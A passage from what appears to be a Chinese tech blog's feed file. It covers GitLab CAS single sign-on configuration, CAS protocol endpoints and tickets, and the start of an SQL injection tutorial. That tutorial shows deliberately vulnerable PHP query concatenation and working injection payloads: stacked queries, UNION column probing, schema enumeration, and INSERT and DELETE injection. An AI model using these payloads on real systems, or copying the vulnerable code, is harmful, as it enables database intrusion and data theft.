class="code"><pre><span class="line"><span class="variable">$a</span> = (<span class="keyword">double</span>) <span class="number">1.2000</span>;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$a</span>);  <span class="comment">//输出: float(1.2)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="宏RETURN-DOUBLE"><a href="#宏RETURN-DOUBLE" class="headerlink" title="#宏RETURN_DOUBLE"></a>#宏RETURN_DOUBLE</h2><p>这里主要了解下PHP源码中函数返回值大都采用宏函数的形式返回，如RETURN_DOUBLE等，具体实现在zend_API.h和zend_types.h文件中。</p><ul><li>简析</li></ul><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">待定...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> microtime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gitlab配置CAS认证</title>
      <link href="2019/05/26/Gitlab%E9%85%8D%E7%BD%AECAS%E8%AE%A4%E8%AF%81/"/>
      <url>2019/05/26/Gitlab%E9%85%8D%E7%BD%AECAS%E8%AE%A4%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<p>Gitlab采用Omniauth框架支持多种认证方式, 在开发SSO系统过程中笔者采用CAS认证的方式打通Gitlab系统与SSO. 采用CAS协议认证需要了解CAS协议交互过程及接口对应的数据结构，可参考上一篇文章<a href="https://ushell.me/2019/05/25/CAS%E5%8D%8F%E8%AE%AE/">CAS协议</a></p><h2 id="Gitlab配置"><a href="#Gitlab配置" class="headerlink" title="#Gitlab配置"></a>#Gitlab配置</h2><ul><li>编辑Gitlab配置文件(/etc/gitlab/gitlab.rb)</li></ul><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### OmniAuth Settings</span></span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_enabled&#x27;</span>] = <span class="literal">true</span></span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_allow_single_sign_on&#x27;</span>] = [<span class="string">&#x27;cas3&#x27;</span>]</span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_sync_email_from_provider&#x27;</span>] = <span class="string">&#x27;cas3&#x27;</span></span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_sync_profile_from_provider&#x27;</span>] = [<span class="string">&#x27;cas3&#x27;</span>]</span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_sync_profile_attributes&#x27;</span>] = [<span class="string">&#x27;email&#x27;</span>]</span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_auto_sign_in_with_provider&#x27;</span>] = <span class="string">&#x27;cas3&#x27;</span></span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_block_auto_created_users&#x27;</span>] = <span class="literal">false</span></span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_external_providers&#x27;</span>] = [<span class="string">&#x27;cas3&#x27;</span>]</span><br><span class="line">gitlab_rails[<span class="string">&#x27;omniauth_providers&#x27;</span>] = [</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;cas3&quot;</span>, <span class="comment">#使用CAS3协议</span></span><br><span class="line">     <span class="string">&quot;label&quot;</span>=&gt; <span class="string">&quot;SSO&quot;</span>,  <span class="comment">#Gitlab登陆页面显示认证名称</span></span><br><span class="line">     <span class="string">&quot;args&quot;</span> =&gt; &#123;</span><br><span class="line">        <span class="string">&quot;url&quot;</span> =&gt; <span class="string">&quot;http://192.168.0.2:8080&quot;</span>, <span class="comment">#SSO地址</span></span><br><span class="line">        <span class="string">&quot;login_url&quot;</span> =&gt; <span class="string">&quot;/login&quot;</span>, <span class="comment">#SSO登陆地址</span></span><br><span class="line">        <span class="string">&quot;service_validate_url&quot;</span> =&gt; <span class="string">&quot;/verify&quot;</span>, <span class="comment">#SSO授权接口</span></span><br><span class="line">        <span class="string">&quot;logout_url&quot;</span> =&gt; <span class="string">&quot;/logout&quot;</span> <span class="comment">#SSO退出接口</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ul><li>重加载配置文件</li></ul><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#gitlab-ctl reconfigure</span></span><br></pre></td></tr></table></figure><ul><li>重启服务</li></ul><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#gitlab-ctl restart</span></span><br></pre></td></tr></table></figure><h2 id="Gitlab-Docker配置"><a href="#Gitlab-Docker配置" class="headerlink" title="#Gitlab Docker配置"></a>#Gitlab Docker配置</h2><p>这里推荐使用docker搭建gitlab服务便于测试</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#gitlab.yml</span><br><span class="line">version: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">services:</span><br><span class="line">    gitlab:</span><br><span class="line">      image: <span class="string">&#x27;gitlab/gitlab-ce&#x27;</span></span><br><span class="line">      restart: always</span><br><span class="line">      container_name: gitlab</span><br><span class="line">      environment:</span><br><span class="line">        <span class="symbol">TZ</span>: <span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line">        <span class="symbol">GITLAB_OMNIBUS_CONFIG</span>: |</span><br><span class="line">          #external_url <span class="string">&#x27;http://gitlab.example.com&#x27;</span></span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_enabled&#x27;</span>] = true</span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_allow_single_sign_on&#x27;</span>] = [<span class="string">&#x27;cas3&#x27;</span>]</span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_sync_email_from_provider&#x27;</span>] = <span class="string">&#x27;cas3&#x27;</span></span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_sync_profile_from_provider&#x27;</span>] = [<span class="string">&#x27;cas3&#x27;</span>]</span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_sync_profile_attributes&#x27;</span>] = [<span class="string">&#x27;email&#x27;</span>]</span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_auto_sign_in_with_provider&#x27;</span>] = <span class="string">&#x27;cas3&#x27;</span></span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_block_auto_created_users&#x27;</span>] = false</span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_external_providers&#x27;</span>] = [<span class="string">&#x27;cas3&#x27;</span>]</span><br><span class="line">          gitlab_rails[<span class="string">&#x27;omniauth_providers&#x27;</span>] = [&#123;<span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;cas3&quot;</span>,<span class="string">&quot;label&quot;</span>=&gt; <span class="string">&quot;SSO&quot;</span>,<span class="string">&quot;args&quot;</span> =&gt; &#123;<span class="string">&quot;url&quot;</span> =&gt; <span class="string">&quot;http://192.168.0.2:8080&quot;</span>,<span class="string">&quot;login_url&quot;</span> =&gt; <span class="string">&quot;/login&quot;</span>,<span class="string">&quot;service_validate_url&quot;</span> =&gt; <span class="string">&quot;/verify&quot;</span>,<span class="string">&quot;logout_url&quot;</span> =&gt; <span class="string">&quot;/logout&quot;</span>&#125;&#125;]</span><br><span class="line">      ports:</span><br><span class="line">        - <span class="string">&quot;80:80&quot;</span></span><br><span class="line">        - <span class="string">&quot;443:443&quot;</span></span><br><span class="line">        - <span class="string">&quot;10022:22&quot;</span></span><br><span class="line">      volumes:</span><br><span class="line">        - <span class="string">&#x27;/srv/gitlab/config:/etc/gitlab&#x27;</span></span><br><span class="line">        - <span class="string">&#x27;/srv/gitlab/logs:/var/log/gitlab&#x27;</span></span><br><span class="line">        - <span class="string">&#x27;/srv/gitlab/data:/var/opt/gitlab&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="#参考"></a>#参考</h2><ol><li>[gitlab docker环境变量] <a href="https://docs.gitlab.com/omnibus/settings/environment-variables.html">https://docs.gitlab.com/omnibus/settings/environment-variables.html</a></li><li>[gitlab支持CAS认证]  <a href="https://gitlab.com/help/integration/cas.md">https://gitlab.com/help/integration/cas.md</a></li><li>[gitlab认证组件omniauth] <a href="https://docs.gitlab.com/ce/integration/omniauth.html">https://docs.gitlab.com/ce/integration/omniauth.html</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> gitlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cas </tag>
            
            <tag> sso </tag>
            
            <tag> gitlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CAS协议</title>
      <link href="2019/05/25/CAS%E5%8D%8F%E8%AE%AE/"/>
      <url>2019/05/25/CAS%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<p>CAS全称是中心认证服务(Central Authentication Service), 是SSO服务中一种认证协议, 目前有三个版本1.0, 2.0, 3.0</p><h2 id="CAS认证流程"><a href="#CAS认证流程" class="headerlink" title="#CAS认证流程"></a>#CAS认证流程</h2><ul><li>认证过程<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">略... <span class="selector-pseudo">:)</span></span><br></pre></td></tr></table></figure></li><li>如图所示<br><img src="/images/cas-protocol.png" class="lazyload" data-srcset="/images/cas-protocol.png" srcset="data:image/png;base64,666"></li></ul><h2 id="CAS协议认证接口URI"><a href="#CAS协议认证接口URI" class="headerlink" title="#CAS协议认证接口URI"></a>#CAS协议认证接口URI</h2><ul><li>接口列表</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>. /login接口</span><br><span class="line"></span><br><span class="line"><span class="attribute">2</span>. /logout接口</span><br><span class="line"></span><br><span class="line"><span class="attribute">3</span>. /validate接口 Ticket认证接口 (v<span class="number">1</span>.<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">4</span>. /serviceValidate接口 Ticket认证接口 (v<span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">5</span>. /proxyValidate接口 Ticket认证/代理接口 (v<span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">6</span>. /proxy接口 代理服务接口 (v<span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">7</span>. /p<span class="number">3</span>/serviceValidate接口 Ticket认证接口（v<span class="number">3</span>.<span class="number">0</span>）</span><br><span class="line"></span><br><span class="line"><span class="attribute">8</span>. /p<span class="number">3</span>/proxyValidate接口 Ticket认证/代理接口 (v<span class="number">3</span>.<span class="number">0</span>)</span><br></pre></td></tr></table></figure><ul><li>接口数据结构</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#login接口</span><br><span class="line">请求参数: </span><br><span class="line"> service=http://<span class="number">686617</span>c54d47/users/auth/cas3/callback?url=http://<span class="number">127.0</span>.<span class="number">0.1</span>/users/sign_in</span><br><span class="line"></span><br><span class="line"> 选填参数:</span><br><span class="line"> renew=</span><br><span class="line"> gateway=</span><br><span class="line"> method=</span><br><span class="line"></span><br><span class="line">响应参数:</span><br><span class="line"> 认证成功: <span class="number">302</span>跳转到service地址, 附带ticket认证成功参数</span><br><span class="line"> 认证失败: SSO登陆页面提示错误信息</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#logout接口</span><br><span class="line">v1.<span class="number">0</span>,v2.<span class="number">0</span>版本:</span><br><span class="line"> 账户退出成功后显示成功信息的页面</span><br><span class="line"></span><br><span class="line">v3.<span class="number">0</span>版本:</span><br><span class="line"> 请求参数中不带service, 显示退出成功页面；参数中带有service，退出成功后跳转到service页面</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#validate接口 (不推荐使用)</span><br><span class="line">请求参数:</span><br><span class="line"> service:</span><br><span class="line"> ticke<span class="variable">t:</span> (login时认证的Ticket)</span><br><span class="line"> renew(选填)</span><br><span class="line"></span><br><span class="line">响应参数:</span><br><span class="line"> 认证成功: yes<span class="symbol">&lt;LF&gt;</span></span><br><span class="line"> 认证失败: <span class="keyword">no</span><span class="symbol">&lt;LF&gt;</span></span><br><span class="line"></span><br><span class="line">#serviceValidate接口</span><br><span class="line">请求参数:</span><br><span class="line"> service:</span><br><span class="line"> ticke<span class="variable">t:</span> (login时认证的Ticket)</span><br><span class="line"> pgtUr<span class="variable">l:</span> (代理url, 选填)</span><br><span class="line"> rene<span class="variable">w:</span> (选填)</span><br><span class="line"> forma<span class="variable">t:</span> (期待响应结果格式:xml或json, Gitlab默认使用XML)</span><br><span class="line"></span><br><span class="line">响应参数:</span><br><span class="line"> 认证成功(xml格式):</span><br><span class="line">  &lt;<span class="keyword">ca</span><span class="variable">s:serviceResponse</span> xmln<span class="variable">s:cas</span>=<span class="string">&quot;http://www.yale.edu/tp/cas&quot;</span>&gt;</span><br><span class="line">   &lt;<span class="keyword">ca</span><span class="variable">s:authenticationSuccess</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">ca</span><span class="variable">s:user</span>&gt;业务参数&lt;/<span class="keyword">ca</span><span class="variable">s:user</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">ca</span><span class="variable">s:attributes</span>&gt;</span><br><span class="line">         &lt;<span class="keyword">ca</span><span class="variable">s:firstname</span>&gt;业务参数&lt;/<span class="keyword">ca</span><span class="variable">s:firstname</span>&gt;</span><br><span class="line">       &lt;/<span class="keyword">ca</span><span class="variable">s:attributes</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">ca</span><span class="variable">s:proxyGrantingTicket</span>&gt;新生成的Ticket&lt;/<span class="keyword">ca</span><span class="variable">s:proxyGrantingTicket</span>&gt;</span><br><span class="line">   &lt;/<span class="keyword">ca</span><span class="variable">s:authenticationSuccess</span>&gt;</span><br><span class="line">  &lt;/<span class="keyword">ca</span><span class="variable">s:serviceResponse</span>&gt;</span><br><span class="line"></span><br><span class="line"> 认证失败(xml格式):</span><br><span class="line">  &lt;<span class="keyword">ca</span><span class="variable">s:serviceResponse</span> xmln<span class="variable">s:cas</span>=<span class="string">&quot;http://www.yale.edu/tp/cas&quot;</span>&gt;</span><br><span class="line">   &lt;<span class="keyword">ca</span><span class="variable">s:authenticationFailure</span> code=<span class="string">&quot;INVALID_TICKET&quot;</span>&gt;</span><br><span class="line">      错误信息</span><br><span class="line">    &lt;/<span class="keyword">ca</span><span class="variable">s:authenticationFailure</span>&gt;</span><br><span class="line">  &lt;/<span class="keyword">ca</span><span class="variable">s:serviceResponse</span>&gt;</span><br><span class="line"></span><br><span class="line">认证失败相关的错误码:</span><br><span class="line">  INVALID_REQUEST | INVALID_TICKET_SPEC | INVALID_TICKET | INVALID_SERVICE | INTERNAL_ERROR     </span><br></pre></td></tr></table></figure><h2 id="Ticket身份票据"><a href="#Ticket身份票据" class="headerlink" title="#Ticket身份票据"></a>#Ticket身份票据</h2><p>ticket是认证周期中身份凭证，ticket字符仅包含{A-Z, a-z, 0-9}和”-“, 字符长度最好大于64位</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">service类型Ticket: </span><br><span class="line"><span class="bullet">  1.</span> 用于校验login service参数中的地址</span><br><span class="line"><span class="bullet">  2.</span> Ticket字符串必须以&quot;ST-&quot;开头</span><br><span class="line"><span class="bullet">  3.</span> Ticket验证次数限制，有效期等安全性</span><br><span class="line"></span><br><span class="line"> proxy类型Ticket:</span><br><span class="line"><span class="bullet">  1.</span> 用于校验proxy service参数中的地址</span><br><span class="line"><span class="bullet">  2.</span> Ticket字符串必须以&quot;PT-&quot;开头</span><br><span class="line"><span class="bullet">  3.</span> Ticket验证次数限制，有效期等安全性</span><br><span class="line"></span><br><span class="line"> proxy-grant类型Ticket:</span><br><span class="line"><span class="bullet">  1.</span> 多级别proxy代理中使用，非一次性ticket</span><br><span class="line"><span class="bullet">  2.</span> Ticket字符串必须以&quot;PGT-&quot;开头</span><br><span class="line"><span class="bullet">  3.</span> Ticket验证次数限制，有效期等安全性</span><br><span class="line"></span><br><span class="line"> login类型Ticket:</span><br><span class="line"><span class="bullet">  1.</span> 登陆成功后标志Ticket</span><br><span class="line"><span class="bullet">  2.</span> Ticket字符串必须以&quot;LT-&quot;开头 </span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code"> ticket-granting类型: </span></span><br><span class="line"><span class="code">  1. Verify认证成功后产生的Ticket</span></span><br><span class="line"><span class="code">  2. Ticket字符串必须以&quot;TGT-&quot;开头</span></span><br><span class="line"><span class="code">  3. Ticket验证次数限制，有效期等安全性</span></span><br><span class="line"><span class="code">  4. 尽量再加密一次Ticket </span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code"> ticket-granting cookie类型:</span></span><br><span class="line"><span class="code">  1. Verify认证成功后产生的Ticket, 保存在Cookie中(同二级域名下使用cookie)</span></span><br><span class="line"><span class="code">  2. Ticket字符串必须以&quot;TGC-&quot;开头</span></span><br><span class="line"><span class="code">  3. Cookie路径严格限制 （多用于同二级域名其他站点）</span></span><br><span class="line"><span class="code">  4. Cookie中可能包含ticket-granting的ticket(不推荐)</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="#参考"></a>#参考</h2><ol><li>[CAS协议细节] <a href="https://apereo.github.io/cas/4.2.x/protocol/CAS-Protocol-Specification.html">https://apereo.github.io/cas/4.2.x/protocol/CAS-Protocol-Specification.html</a>  </li><li>[CAS协议原理] <a href="https://apereo.github.io/cas/4.2.x/protocol/CAS-Protocol.html">https://apereo.github.io/cas/4.2.x/protocol/CAS-Protocol.html</a></li><li>[CAS客户端实现] <a href="https://apereo.github.io/cas/4.2.x/integration/CAS-Clients.html">https://apereo.github.io/cas/4.2.x/integration/CAS-Clients.html</a></li><li>[CAS原理解析] <a href="https://juejin.im/post/5a002b536fb9a045132a1727">https://juejin.im/post/5a002b536fb9a045132a1727</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> protocol </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cas </tag>
            
            <tag> sso </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How SQLi ATTACK</title>
      <link href="2018/01/21/How-SQLi-ATTACK/"/>
      <url>2018/01/21/How-SQLi-ATTACK/</url>
      
        <content type="html"><![CDATA[<p>  SQL语言是实现数据库操作的一种编程语言，数据库解析器通过解析SQL实现对数据的增删改查等操作。目前主流数据库有MySQL、Oracle、MSSQL、Postgresql、MongoDB等等。Web架构采用脚本语言+数据库的形式构建服务，SQLi就出现在脚本语言逻辑处理中。而SQLi(SQL Injection)攻击已经延续了十多年之久，历年占据OWASP Top10榜首。SQLi在传统框架中出现的频率极为高，而现代形式Web框架从底层屏蔽了SQLi出现的可能性。</p><h2 id="SQL基础"><a href="#SQL基础" class="headerlink" title="#SQL基础"></a>#SQL基础</h2><p>SQL语言分为DDL、DML、DCL、TCL等，其中DML语言是目前使用最高的。<br>DDL语言（Data Definition Language）</p><ul><li>create</li><li>alter</li><li>drop</li><li>truncate</li><li>comment</li><li>rename</li></ul><p>DML语言(Data Manipulation Language)</p><ul><li>select</li><li>insert</li><li>update</li><li>delete</li><li>merge</li><li>call</li><li>explain plan</li><li>lock table</li></ul><p>DCL语言(Data control language)</p><ul><li>grant</li><li>revoke</li></ul><p>TCL语言(Transcation control language)</p><ul><li>commit</li><li>savepoint</li><li>rollback    </li><li>set transcation</li></ul><p>由于权限的原因，SQLi常使用的DDL+DML对系统后端数据库操作。一个基础SQLi的产生是后端系统未对用户输入的数据进行过滤，使用户输入数据与业务SQL语句拼接，导致产生非法操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//业务逻辑</span></span><br><span class="line">   <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">   <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">   <span class="comment">//字符型注入</span></span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;select * from user where username=&#x27;<span class="subst">&#123;$name&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">   <span class="comment">//数字型注入</span></span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;select * from user where id = &#x27;<span class="subst">&#123;$id&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>攻击Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">  http:<span class="comment">//127.0.0.1/index.php?name=admin&#x27;;select @@version#</span></span><br><span class="line">  http:<span class="comment">//127.0.0.1/index.php?id=1;select @@version#</span></span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">一、后端数据库种类毕竟多，需要识别数据库类型，依据不同数据库特性区分</span><br><span class="line">* @@version变量</span><br><span class="line">* 特定函数</span><br><span class="line">- MySQL =&gt; last_insert_id()</span><br><span class="line">- MSSQL =&gt; @@rowcount </span><br><span class="line">- Oracle =&gt; BITAND(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">* 字符串拼接处理不同</span><br><span class="line">- MySQL/Postgresql =&gt; 空格拼接</span><br><span class="line">- MSSQL =&gt; 加号拼接</span><br><span class="line">- Oracle =&gt; ||符合拼接</span><br><span class="line"></span><br><span class="line">二、Union/Order by特性获取列数</span><br><span class="line">```php</span><br><span class="line"><span class="comment">//查询列表数目</span></span><br><span class="line">index.php?id=<span class="number">12</span>+select+<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,...</span><br><span class="line"><span class="comment">//字符显示位</span></span><br><span class="line">index.php?id=<span class="number">12</span>+order+by+<span class="number">1</span></span><br><span class="line">````</span><br><span class="line">三、获取数据库表名</span><br><span class="line">```php</span><br><span class="line">MSSQL:</span><br><span class="line">数据库名：master..sysdatabases</span><br><span class="line">select name <span class="keyword">from</span> master..sysdatabases;</span><br><span class="line"></span><br><span class="line">MySQL:</span><br><span class="line">数据库名：information_schema.schemata</span><br><span class="line">表名：information_schema.tables</span><br><span class="line">权限: information_schema.schema_privileges</span><br><span class="line">表名：mysql.db（管理权限）</span><br><span class="line">select SCHEMA_NAME <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line">select TABLE_NAME <span class="keyword">from</span> information_schema.tables;</span><br><span class="line">select COLUMN_NAME <span class="keyword">from</span> information_schema.columns where TABLE_NAME=<span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Oracle:</span><br><span class="line">用户表: user_tables</span><br><span class="line">表：all_tables</span><br><span class="line">权限表: user_sys_privs</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>至此一个基础SQLi攻击过程完毕，在复杂的业务场景中，SQLi并不局限于select形式的注入，还有insert、update、delete等形式的注入场景。相对于select来说更为复杂，不可见、难操作。</p><p>INSERT注入的奇思妙想：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into user(username, password)values(&#x27;&quot;</span>.<span class="variable">$_GET</span>[name].<span class="string">&quot;&#x27;, password(&#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&#x27;))&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAYLOAD</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;x&#x27;</span>,(select @@version)--</span><br><span class="line"></span><br><span class="line"><span class="comment">//可控点插入特定SQL，常见于个人信息编写业务中</span></span><br></pre></td></tr></table></figure><p>UPDATE注入的奇思妙想:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update user set name=&#x27;&quot;</span> .<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]. <span class="string">&quot;&#x27; where id=1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//本质与insert相同</span></span><br></pre></td></tr></table></figure><p>DELETE注入的奇思妙想:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;delete from user where username=&#x27;<span class="subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAYLOAD</span></span><br><span class="line">name=admin<span class="string">&#x27;+union+select+if(current_user()=&#x27;</span>root<span 